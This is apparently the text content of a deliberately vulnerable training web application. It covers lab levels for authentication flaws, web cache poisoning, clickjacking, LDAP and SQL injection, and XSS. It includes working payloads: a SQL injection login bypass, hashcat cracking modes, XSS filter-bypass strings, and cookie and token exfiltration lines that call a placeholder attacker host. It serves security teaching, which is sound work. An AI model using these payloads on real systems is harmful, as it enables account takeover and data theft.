Name: AuthenticationVulnerability
Description:
Authentication Vulnerabilities occur when an application's login mechanism is implemented insecurely, allowing attackers to compromise user accounts. Common weaknesses include SQL injection in the login query, logging sensitive data, storing passwords in plaintext or with weak hashing algorithms (MD5, SHA1), providing different error messages that allow username enumeration, and lacking strong password policies.

These vulnerabilities are covered under OWASP Top 10 A07:2021 – Identification and Authentication Failures.

Note: For most levels, you can explore the database contents directly at the H2 Console:
- Legacy UI: http://localhost:9090/VulnerableApp/h2/
- Docker UI: http://localhost/VulnerableApp/h2/login.jsp
(URL: jdbc:h2:mem:testdb, Username: readonly_user, Password: readonly_password)

Important Links:
  1. OWASP Top 10 - A07:2021
  2. CWE-287: Improper Authentication
  3. OWASP Authentication Cheat Sheet
  4. OWASP Password Storage Cheat Sheet

AttackVectors.CurlPayload: Try bypassing the login by entering 'admin_sqli' as the username and the payload ' OR 1=1 -- as the password. This is a classic SQL Injection (SQLi) attack.
AttackVectors.Description: The login query uses string concatenation, allowing an attacker to bypass authentication using a simple ' OR 1=1 — payload. This highlights the importance of using Parameterized Queries (Prepared Statements). Check the database to see the auth_users table.

ChallengeCard.ChallengeText: Log in as admin_sqli without knowing the real password. The login query concatenates your input directly into the SQL string.

hints.text: The password parameter is dropped straight into the WHERE clause. The username is optional - a known account is admin_sqli.
Make the condition always true. AND binds tighter than OR, so an always-true OR clause overrides the password check.
Close the open quote, add OR '1'='1, and comment out the rest with -- (the trailing space matters in H2).

payload.description: SQL injection in the password parameter that bypasses authentication.

AttackVectors.CurlPayload: Login with username 'admin_logs' and any password. Then, check the server console or logs to see the provided password exposed in plaintext, highlighting sensitive logging concerns.Check the database (as mentioned in the module description) to find the plaintext password for this user.
AttackVectors.Description: The application logs the provided password in plaintext. Check the server logs (console or log file) to see exposed credentials. This demonstrates a sensitive logging issue and why sensitive data should never be logged.

ChallengeCard.ChallengeText: Make a login attempt and confirm that the submitted password is written to the server logs in plaintext, demonstrating a sensitive-data-logging flaw.

hints.text: Passwords and other sensitive data should never be written to logs; they leak via log files, log aggregators, and backups.
This endpoint logs the submitted password on every attempt. Trigger a login with any password.
Open the server console or log file and find the line that records the username and password in plaintext.

payload.description: Trigger a login and inspect the server logs to confirm the password is recorded in plaintext.
payload.value: Submit any login, then read the console/log line beginning "Login attempt for user:" that prints the username and password in plaintext.

AttackVectors.CurlPayload: Login with username 'admin_plain' and any password. Check the database (as mentioned in the module description) to find the plaintext password for this user.
AttackVectors.Description: Password is stored in plaintext in the database and returned in the API response. An attacker with database access (SQL injection, backup leak, insider threat) can read all passwords directly. Check the DB at the URL provided in the module description.

ChallengeCard.ChallengeText: Log in as admin_plain. The password is stored in plaintext in the database - retrieve and use it.

hints.text: Plaintext storage means anyone with database access (SQLi, backup leak, insider) can read passwords instantly.
Open the H2 console at /h2 and query the auth_users table for the admin_plain row.
Read the password column for admin_plain and submit it; on success the app even echoes passwordInDB.

payload.description: Read the plaintext password from the database via the H2 console and authenticate.
payload.value: SELECT username,password FROM auth_users WHERE username='admin_plain' (run in the /h2 console).

AttackVectors.CurlPayload: Login with username 'admin_md5' and any password. Find the MD5 hash in the database and try reversing it using an online cracker like CrackStation.
AttackVectors.Description: Password is hashed using MD5, which is cryptographically broken and should never be used for password storage. MD5 hashes can be reversed using rainbow tables in seconds.

ChallengeCard.ChallengeText: Inspect how admin_md5's password is stored. Find the stored hash in the database and recognize why MD5 makes this account easy to compromise.

hints.text: MD5 is cryptographically broken and unfit for passwords; it has no salt and no work factor, and identical inputs always yield the same hash.
Open the H2 console (/h2) and read the stored value for admin_md5 in auth_users; the password is kept as a raw, unsalted MD5 digest.
Because MD5 is fast and unsalted, anyone who reads this hash could recover a weak password offline in seconds with a wordlist or rainbow table (e.g. hashcat -m 0).

payload.description: Read the stored MD5 hash from the database and identify the weak, unsalted hashing scheme that exposes the password to offline cracking.
payload.value: SELECT username,password,algorithm FROM auth_users WHERE username='admin_md5' (run in the /h2 console) - note the raw, unsalted MD5.

AttackVectors.CurlPayload: Login with username 'admin_sha1' and any password. Find the SHA-1 hash in the database and try reversing it to demonstrate why SHA-1 is no longer suitable.
AttackVectors.Description: Password is hashed using SHA-1, which is deprecated and considered insecure since 2017. SHA-1 remains vulnerable to collision attacks and rainbow table lookups.

ChallengeCard.ChallengeText: Inspect how admin_sha1's password is stored. Locate the stored hash in the database and recognize why SHA-1 is unsafe for passwords.

hints.text: SHA-1 has been deprecated since 2017; here it is stored fast and unsalted, which is unsuitable for passwords.
Open the H2 console (/h2) and read the stored value for admin_sha1 in auth_users; it is a raw, unsalted SHA-1 digest.
Like MD5, a fast unsalted SHA-1 lets anyone with the hash recover a weak password offline with a wordlist or rainbow table (e.g. hashcat -m 100).

payload.description: Read the stored SHA-1 hash from the database and identify the fast, unsalted scheme that exposes weak passwords to offline cracking.
payload.value: SELECT username,password,algorithm FROM auth_users WHERE username='admin_sha1' (run in the /h2 console) - note the raw, unsalted SHA-1.

AttackVectors.CurlPayload: Login with username 'admin_sha256' and any password. The unsalted SHA-256 hash in the database is still vulnerable to rainbow table attacks.
AttackVectors.Description: Password is hashed using SHA-256 but without a salt. While SHA-256 is stronger than MD5, the absence of a unique salt allows for large-scale precomputed (rainbow table) attacks.

ChallengeCard.ChallengeText: Inspect how admin_sha256's password is stored. Find the stored hash and recognize why SHA-256 without a salt is still weak for passwords.

hints.text: SHA-256 is a strong general-purpose hash, but it is fast and here it is stored with no salt.
Open the H2 console (/h2) and read the stored value for admin_sha256; compare it with other users to confirm there is no per-user salt.
With no salt and a fast algorithm, identical passwords give identical hashes and weak passwords fall to precomputed or wordlist attacks (e.g. hashcat -m 1400).

payload.description: Read the unsalted SHA-256 hash from the database and identify why a missing salt plus a fast hash exposes weak passwords.
payload.value: SELECT username,password,salt,algorithm FROM auth_users WHERE username='admin_sha256' (run in the /h2 console) - note the empty salt.

AttackVectors.CurlPayload: Try enumerating usernames: login with a non-existent user to see 'User not found', then with 'admin_enum' to see 'Invalid password'. This allows an attacker to discover valid usernames.
AttackVectors.Description: The application returns different error messages for non-existent users ("User not found") vs wrong passwords ("Invalid password"). This enables an attacker to discover valid usernames on the system.

ChallengeCard.ChallengeText: The login returns different errors for unknown users versus wrong passwords. Use that to discover a valid username.

hints.text: Compare the messages: a fake user returns "User not found"; a real user with a bad password returns "Invalid password".
This difference confirms which usernames exist without knowing any password - the basis for targeted attacks.
Submit candidate usernames with any password; the one returning "Invalid password" is a valid account.

payload.description: Distinguish valid usernames by comparing the "User not found" and "Invalid password" responses.
payload.value: Send admin_enum with any password to get "Invalid password"; a fake user returns "User not found".

AttackVectors.CurlPayload: Login with 'admin_weak' and a common weak password (hint: it starts with 'password'). Observe that credentials are now sent in the POST body to prevent URI logging.
AttackVectors.Description: Credentials are passed in the POST body to avoid URI logging, and strong hashing (BCrypt) is used. However, the password itself is weak. This level teaches that both a strong algorithm and a strong password policy are necessary for security.

ChallengeCard.ChallengeText: Log in as admin_weak. BCrypt protects the hash, but the password itself is weak and guessable.

hints.text: Strong hashing cannot save a weak password - the human-chosen secret is the weak link.
This account uses one of the most common passwords. Try a short list of top passwords.
It is a very common password that starts with "password" - try it via the POST login form.

payload.description: Online dictionary or guessing attack against admin_weak using a common-password list.
payload.value: POST username=admin_weak with a top-10 common password (rockyou-style, "password" plus digits).

AttackVectors.CurlPayload: This is the secure implementation. Try to enumerate usernames or crack the BCrypt hash (check the database) â you will find it significantly more difficult!
AttackVectors.Description: Secure baseline: Credentials passed in the POST body, BCrypt hashing with unique salts, and a generic "Invalid credentials" error message regardless of the failure cause, preventing cracking and enumeration.

AttackVectors.CurlPayload: Submit standard credentials (e.g., admin/admin) to witness the computational speed and exposure of the weak BCrypt hash returned in the metadata payload.
AttackVectors.Description: The application utilizes a modern adaptive hashing algorithm (BCrypt) but configures it with a dangerously low work factor/cost parameter (Cost: 4). This significantly reduces the computational cycles required to generate a hash, making the password database highly vulnerable to rapid offline brute-force and dictionary attacks if compromised.

ChallengeCard.ChallengeText: Log in as admin_lowcost. The password is hashed with BCrypt, but its work factor is set far too low - recover the password and authenticate.

hints.text: BCrypt is only as strong as its cost (work) factor; a low cost makes offline brute-force and wordlist attacks dramatically faster.
Open the H2 console (/h2) and read admin_lowcost's stored hash; the number after $2a$ is the cost factor - here it is 04, far below the recommended 10-12.
Because the cost is only 4, a common password falls quickly to a wordlist attack (hashcat -m 3200); recover it and log in via the POST form.

payload.description: Read the low-cost BCrypt hash from the database, crack it offline with a wordlist, and log in.
payload.value: SELECT username,password FROM auth_users WHERE username='admin_lowcost' (run in the /h2 console) - note the $2a$04$ cost factor, then hashcat -m 3200.

Name: CachePoisoning
Description:
Web Cache Poisoning occurs when an attacker manipulates a shared web cache—such as a CDN, Reverse Proxy, or Load Balancer—to store a malicious or unintended response. These systems are designed to optimize performance by serving cached versions of frequently requested resources to reduce latency and backend load. The attack succeeds when there is a discrepancy between the Cache Key (the set of request attributes the cache uses to identify a resource) and the application's processing logic. By manipulating unkeyed inputs (headers, cookies, or parameters that are reflected in the response but not included in the cache key), an attacker can "poison" the cache for a specific resource. Once stored, this poisoned response is served to all subsequent users requesting that resource until the cache entry expires or is cleared.

Important Links:
  1. OWASP Cache Poisoning
  2. PortSwigger Web Cache Poisoning
  3. RFC 9111 - HTTP Caching
  4. Youtube Lab: Web cache poisoning
  5. Youtube: Novel Web Cache Poisoning Techniques

AttackVectors.CurlPayload:
This level simulates a shared cache that stores the response only by route.
How to exploit this level?
1. Call /VulnerableApp/CachePoisoning/LEVEL_1?banner=FAKE%20URGENT%20UPDATE to poison the cache.
2. Call /VulnerableApp/CachePoisoning/LEVEL_1 without the query parameter.
3. The second response is served from cache and still contains the poisoned banner.
AttackVectors.Description: This level demonstrates a cache key that only includes the request path (route). The application reflects a query parameter in the response but does not include it in the cache key. An attacker can poison the resource for all users by providing a malicious parameter in the first request.

AttackVectors.CurlPayload:
Since the banner is reflected without escaping, we can inject a script.
How to exploit?
1. Call /VulnerableApp/CachePoisoning/LEVEL_1?banner=%3Cscript%3Ealert(document.cookie)%3C/script%3E.
2. All users accessing /VulnerableApp/CachePoisoning/LEVEL_1 will now execute the script due to the poisoned cache.
Alternative payloads: <img src=x onerror=alert(document.cookie)>, <svg onload=alert(document.cookie)>, <iframe src="javascript:alert(document.cookie)">.
AttackVectors.Description: Cross-Site Scripting (XSS) via Cache Poisoning. Since the banner parameter is reflected without sanitization and the cache only keys on the route, an attacker can store a malicious script in the cache that will execute for all subsequent users.

AttackVectors.CurlPayload:
This level adds a naive filter that removes only obvious script payloads, but the cache key is still based on the route alone.
How to exploit this level?
1. Call /VulnerableApp/CachePoisoning/LEVEL_2?banner=%3Cb%3EURGENT%20STATUS%20UPDATE%3C/b%3E to poison the cache with harmless-looking HTML.
2. Call /VulnerableApp/CachePoisoning/LEVEL_2 without the query parameter.
3. The victim still receives the cached attacker-controlled response even though the app tried to filter the input.
Alternative payloads: <a href="https://phishing.example">Reauthenticate here</a> (phishing link), <h1 style="color:red">SYSTEM BREACH - CALL SUPPORT 1-800-SCAM</h1> (social engineering), <marquee>Service outage: please resend payment</marquee> (misleading notice).
AttackVectors.Description: This level attempts to fix the issue by stripping script tags from the input, but the cache key still only uses the route. Attackers can still poison the cache with misleading content or other HTML payloads that bypass the naive filter.

AttackVectors.CurlPayload:
Obvious script tags are filtered, but we can use HTML event handlers.
How to exploit?
1. Call /VulnerableApp/CachePoisoning/LEVEL_2?banner=%3Cimg%20src=%22x%22%20onerror=%22alert(document.cookie)%22%3E.
2. The server-side filter misses this, and the cache stores the malicious image tag, causing XSS for everyone.
Alternative bypasses: <svg onload=alert(document.cookie)>, <input autofocus onfocus=alert(document.cookie)>, <body onload=alert(document.cookie)>. The naive filter only strips <script> tags and the javascript: scheme, so any other event handler bypasses it.
AttackVectors.Description: XSS via Cache Poisoning with Filter Bypass. The application strips obvious

AttackVectors.CurlPayload:
The cache key is URI + banner. The trap is X-Forwarded-Host: it is reflected into the response's asset URL but is not part of the key (it is an unkeyed header). Poison the host once and every victim requesting the same banner gets it from cache.
How to exploit (in the lab):
1. Type shared-status in Shared banner key, attacker.example in Attacker forwarded host, click Poison cache. Check X-Cache-Key: only the banner is in it.
2. Click Send victim request using only the same banner.
3. Asset URL still points to attacker.example; X-Cache-Status: HIT confirms the poison.
Alternative payloads (Reset cache → same banner, new value in Attacker forwarded host → Poison cache → Send victim request):
  • login-cdn.test — CDN typosquat for phishing
  • 192.168.1.1 — force request to an internal IP (SSRF-adjacent)
  • cdn-backup.test — impersonate a legitimate backup CDN
AttackVectors.Description: This level includes the query parameter in the cache key but still trusts the X-Forwarded-Host header to build absolute URLs for assets. Since the shared cache does not include this header in its key (Unkeyed Header), an attacker can poison the asset host for all subsequent visitors.

AttackVectors.CurlPayload:
The asset host is attacker-controlled (see base payload), so every victim on the same banner key loads the attacker's JS - stored XSS scoped to that cached route.
How to exploit (in the lab):
1. Same flow as the base payload, but use evil-script-server.test as the host.
2. Open DevTools → Network tab and observe the failed request to evil-script-server.test. The failure is expected (placeholder domain). In a real attack the adversary owns the host and the JS runs in the victim's origin.
Impact: Origin takeover - JS has access to the victim's DOM, cookies, and storage.
Alternative payloads (JS the attacker would serve at /assets/cache-poisoning-demo.js; cannot run in the lab, but illustrate real-world impact):
  • fetch("https://evil-script-server.test/?c="+document.cookie) — cookie exfil
  • document.body.innerHTML="<h1>Defaced</h1>" — defacement
  • new Image().src="https://evil-script-server.test/?k="+localStorage.getItem("token") — token exfil via image beacon (bypasses fetch-only CSP)
AttackVectors.Description: JavaScript Injection via Cache Poisoning. Since the application trusts the X-Forwarded-Host header to build asset URLs, an attacker can poison the cache to point to a malicious domain, causing all users to load and execute external scripts.

AttackVectors.CurlPayload:
This level no longer trusts forwarding headers (the LEVEL_3 lesson is fixed), but it introduces a different unkeyed input: the demo_user cookie. The server reads the cookie to render personalized PII (username, email and last login IP) into the response body, then sends Cache-Control: public, max-age=60 while the cache key stays route-only. Because the cookie never participates in the cache key, the first requester's personalized response is stored once and replayed to everyone else for the next 60 seconds. The poisoning primitive here is not injection - it is the mismatch between "this body depends on the cookie" and "this body is safe to share with strangers".
How to exploit this level?
1. As the first requester (the "victim" whose data will leak), call /VulnerableApp/CachePoisoning/LEVEL_4 with cookie demo_user=alice. The response body now contains Logged in as: alice, alice@vulnerableapp.local and her deterministic last login IP. Inspect X-Cache-Status: MISS and X-Cache-Key - the key is just the route, the cookie is nowhere in it.
2. From a clean browser (or a different machine, or curl with no cookies), call /VulnerableApp/CachePoisoning/LEVEL_4 without sending any cookie.
3. The shared cache matches the same route-only key and replays Alice's personalized body to you. X-Cache-Status: HIT confirms it. You are not Alice and you sent no cookie, but you just received her username, email and last login IP.
Impact: PII disclosure across user boundaries with zero authentication required from the attacker. The attacker only needs to time their request inside the cache TTL after a real user populates the entry. This is the same class of bug behind real-world incidents where shared CDNs returned one user's account page to anonymous visitors (Stack Overflow 2016, Steam 2015) - the application "works correctly" per request, but the cache layer turns a private response into a public one.
Alternative payloads: demo_user=ceo (leak the C-suite account's email and login IP), demo_user=billing (leak the billing role's PII), demo_user=support (leak the support team's identity for targeted phishing). Any cookie value that produces "interesting" personalization can be poisoned the same way - the vulnerability is the cache policy, not the value.
AttackVectors.Description: This level demonstrates the danger of caching personalized content (driven by cookies) as public. The response body varies per user (username, email, last login IP) because it reads the demo_user cookie, but the cookie is an unkeyed input - it never participates in the cache key. The shared cache stores the response under the route alone with Cache-Control: public, so the first requester's PII is served to every subsequent visitor for the rest of the TTL.

AttackVectors.CurlPayload:
The previous levels' primitives are all defused. Untrusted forwarding headers are ignored when building asset URLs, the banner is HTML-escaped, and personalized responses are marked Cache-Control: private, no-store so the shared cache cannot store or reuse them across users.
What to verify (in the lab):
1. Replay the L3 attack: type any value in Optional banner preview and attacker.example in Optional forwarded host, click Poison cache. The asset URL stays on the trusted host, not attacker.example.
2. Replay the L4 attack: set Personalized demo_user to admin, click Poison cache. Click Send guest request without the cookie - the response is fresh, no admin PII leaks.
3. On every request, diagnostics show Cache-Control: private, no-store and X-Cache-Status: MISS. The shared cache never stores the response.
Why is this safe?
  • Trusted asset host — the server hardcodes static.vulnerableapp.local instead of reading X-Forwarded-Host, so the L3 unkeyed-header trick has nothing to inject.
  • Private cache policy — private, no-store tells shared caches "do not store this response", so the L4 PII leak cannot happen.
  • Banner is escaped — HTML special characters are encoded, neutralizing the L1/L2 XSS primitives even if a stale entry were ever served.
AttackVectors.Description: This secure level demonstrates proper cache isolation. It ignores untrusted forwarding headers and marks personalized or sensitive responses as private and no-store, preventing shared caches from storing and reusing them across different users.

Name: ClickjackingVulnerability
Description:
Clickjacking (also known as a UI redress attack) is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the top-level page. Clickjacking attacks exploit the ability of browsers to embed pages in iframes. An attacker creates a malicious page that loads the target site in a transparent iframe overlaid on top of a decoy UI. When the user clicks what they think is a legitimate button, they are actually clicking on the hidden, embedded page.

The primary defenses against clickjacking are HTTP response headers that instruct the browser whether a page is allowed to be framed.

Important Links:
  1. OWASP Clickjacking Attack
  2. OWASP Clickjacking Defense Cheat Sheet
  3. CWE-1021: Improper Restriction of Rendered UI Layers or Frames
  4. MDN: X-Frame-Options
  5. MDN: CSP frame-ancestors

AttackVectors.CurlPayload: Payload is not applicable for the attack vector.
AttackVectors.Description: No X-Frame-Options or Content-Security-Policy frame-ancestors header is set. The page can be embedded in an iframe from any origin, making it fully vulnerable to clickjacking.

ChallengeCard.ChallengeText: Embed this page in an iframe from a different origin and trick a user into clicking a hidden button.

hints.text: This page sets no X-Frame-Options or CSP header.
Create an HTML page with an iframe pointing to this URL.
Overlay a transparent iframe over a fake button to hijack the click.

payload.description: HTML page embedding the vulnerable page in an iframe

AttackVectors.CurlPayload: Payload is not applicable for the attack vector.
AttackVectors.Description: X-Frame-Options header is set to ALLOWALL, which explicitly permits embedding from any origin. This is equivalent to having no protection.

ChallengeCard.ChallengeText: The page sets X-Frame-Options: ALLOWALL. Embed it in an iframe from any origin.

hints.text: ALLOWALL explicitly permits embedding from any origin.
This header provides no protection against clickjacking.
Same attack as Level 1 works here.

payload.description: iframe embedding allowed by ALLOWALL header

AttackVectors.CurlPayload: Payload is not applicable for the attack vector.
AttackVectors.Description: X-Frame-Options header is set to SAMEORIGIN, which only allows the page to be embedded by pages on the same origin. Cross-origin clickjacking is prevented, but same-origin framing is still allowed.

ChallengeCard.ChallengeText: The page sets X-Frame-Options: SAMEORIGIN. Can you still embed it from the same origin?

hints.text: SAMEORIGIN only blocks cross-origin framing.
A page hosted on the same origin can still embed this page.
Host your attack page on the same domain to bypass SAMEORIGIN.

payload.description: Same-origin iframe bypassing SAMEORIGIN restriction

AttackVectors.CurlPayload: Payload is not applicable for the attack vector.
AttackVectors.Description: No framing protection header is set. This level demonstrates a UI overlay attack: the attacker overlays a nearly-transparent victim page on top of fake "prize" content. The victim clicks what appears to be a prize button but unknowingly triggers a sensitive action on the victim page.

ChallengeCard.ChallengeText: Use a UI overlay attack to trick the user into clicking a hidden sensitive button under a fake prize button.

hints.text: There is no framing protection on this page.
Overlay a nearly transparent iframe over a decoy element.
Set the iframe opacity to near zero so the victim cannot see it.

payload.description: Transparent iframe overlay attack

AttackVectors.CurlPayload: Payload is not applicable for the attack vector.
AttackVectors.Description: X-Frame-Options header is set to SAMEORIGIN, but this only prevents cross-origin framing. A same-origin attacker page can still overlay the victim page and perform a UI redress attack. This level shows that SAMEORIGIN alone is insufficient when the attacker controls a page on the same origin.

ChallengeCard.ChallengeText: SAMEORIGIN is set but a same-origin attacker page can still overlay the victim. Perform the overlay attack from the same origin.

hints.text: SAMEORIGIN does not protect against same-origin attackers.
Host your attack page on the same origin as the victim.
Use the same overlay technique as Level 6 from the same origin.

Name: CommandInjection
Description:
Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

Name: CryptographicFailures
Description:
Cryptographic Failures occur when sensitive data is not properly protected using strong cryptographic algorithms and secure storage mechanisms. This vulnerability can lead to exposure of sensitive information such as passwords, credit card numbers, personal data, and authentication tokens. Common issues include: using weak hashing algorithms (MD5, SHA1), storing data in plaintext, using broken encryption algorithms (DES, RC4), and improper key management.

You can explore the database contents directly at the H2 Console and to find and crack the secrets:
Legacy UI: http://localhost:9090/VulnerableApp/h2/
Docker UI: http://localhost/VulnerableApp/h2/login.jsp

  • Username: cryptographic_failures_user
  • Password: cryptographic_failures_password

Important Links:

  2. CWE-327: Use of a Broken or Risky Cryptographic Algorithm
  3. CWE-326: Inadequate Encryption Strength

Name: LDAPInjectionVulnerability
Description:
LDAP Injection occurs when user-supplied input is directly concatenated into LDAP queries or filters without proper validation or escaping. LDAP (Lightweight Directory Access Protocol) is commonly used by applications to query directory services for authentication, user information, and organizational data.

When applications construct LDAP filters using untrusted input, attackers can inject special LDAP characters such as *, (, ), |, or & to modify the intended query logic. By manipulating the filter structure, attackers may retrieve unintended directory entries, bypass authentication checks, or access sensitive information stored in the directory.

For example, if an application builds a filter like (uid={username}), an attacker might supply input such as *)(uid=*. This changes the query logic and may cause the directory server to return all user records instead of a specific one.

Proper prevention techniques include validating user input, escaping special LDAP characters, or using safe APIs that automatically encode user input before constructing LDAP filters.

NOTE: Each level progressively demonstrates how improper handling of LDAP filters can lead to security vulnerabilities and how proper encoding mitigates these risks.



Important Links:
  1. OWASP LDAP Injection
  2. PortSwigger LDAP Injection

AttackVectors.Description: Information Disclosure and Username Enumeration via LDAP Injection. The application constructs LDAP queries using unsanitized input and logical conditions. Attackers can manipulate filters using wildcards (*) or partial patterns to retrieve multiple user entries and explore the directory structure.

AttackVectors.Description: Authentication Bypass via LDAP Injection. The application uses user input in authentication filters. Attackers can inspect wildcard or crafted inputs to bypass password validation and authenticate as another user without knowing valid credentials.

AttackVectors.CurlPayload: Try injection characters like *, (|(uid=*) or )(uid=*) and observe that the application prevents manipulation due to encoding. However, this does not focuses on authentication security.
AttackVectors.Description: This level demonstrates input encoding using a safe LDAP filter encoder.  Special characters are escaped before constructing the LDAP query, preventing basic LDAP injection attacks.

AttackVectors.Description: Blind LDAP Injection leading to Authentication Bypass. The application does not display user data but reveals success or failure responses. Attackers can manipulate LDAP filters to bypass authentication or infer valid credentials.

Description:

An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application.
The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.

RFC 2616 - "Hypertext Transfer Protocol - HTTP/1.1" target="_blank" defines a variety of 3xx status codes that will cause a browser to redirect to a specified location and this implementation is based on 3xx status codes

Name: BlindSQLInjectionVulnerability
Description:
A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.

1 AND 1=2

{ "isCarPresent": false }

Name: PersistentXSSInHTMLTagVulnerability
Description:
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.

For more information on XSS:

  2. Google Application Security
